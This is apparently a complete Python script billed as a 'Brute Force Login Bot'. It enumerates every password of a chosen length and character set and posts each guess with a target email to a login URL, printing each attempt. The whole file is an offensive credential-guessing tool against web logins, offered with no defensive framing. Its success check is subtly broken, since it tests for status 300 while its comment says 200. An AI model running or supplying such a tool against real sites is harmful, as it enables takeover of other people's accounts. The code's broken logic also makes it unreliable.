import requests
import itertools
import string

def generate_passwords(length, chars):
    """Generate all possible passwords of a given length using the provided characters."""
    return (''.join(candidate) for candidate in itertools.product(chars, repeat=length))

def brute_force_login(url, email, password_length, password_type):
    chars = ''
    if 'lowercase' in password_type:
        chars += string.ascii_lowercase
    if 'uppercase' in password_type:
        chars += string.ascii_uppercase
    if 'digits' in password_type:
        chars += string.digits
    if 'special' in password_type:
        chars += string.punctuation

    passwords = generate_passwords(password_length, chars)
    
    for password in passwords:
        data = {'email': email, 'password': password}
        response = requests.post(url, data=data)
        
        print(f'Trying password: {password} - Response: {response.status_code}')
        
        if response.status_code == 300:  # Assuming 200 means successful login
            print(f'Success! The correct password is: {password}')
            return

def main():
    ascii_art = r"""
    M#"""""""'M                                      dP       M#"""""""'M             dP   
    ##  mmmm. `M                                     88       ##  mmmm. `M            88   
    #'        .M 88d888b. .d8888b. .d8888b. .d8888b. 88d888b. #'        .M .d8888b. d8888P 
    M#  MMMb.'YM 88'  `88 88ooood8 88'  `88 88'  `"" 88'  `88 M#  MMMb.'YM 88'  `88   88   
    M#  MMMM'  M 88       88.  ... 88.  .88 88.  ... 88    88 M#  MMMM'  M 88.  .88   88   
    M#       .;M dP       `88888P' `88888P8 `88888P' dP    dP M#       .;M `88888P'   dP   
    M#########M                                               M#########M                                                                              
    """
    print(ascii_art)
    print("Brute Force Login Bot")
    url = input("url_endpoint : ")
    email = input("email : ")
    try:
        password_length = int(input("password_length :"))
    except ValueError:
        print("Please enter a valid number for the password length.")
        return

    password_type = input("Enter the password type (e.g., lowercase, uppercase, digits, special): ").split()
    
    brute_force_login(url, email, password_length, password_type)

if __name__ == '__main__':
    main()
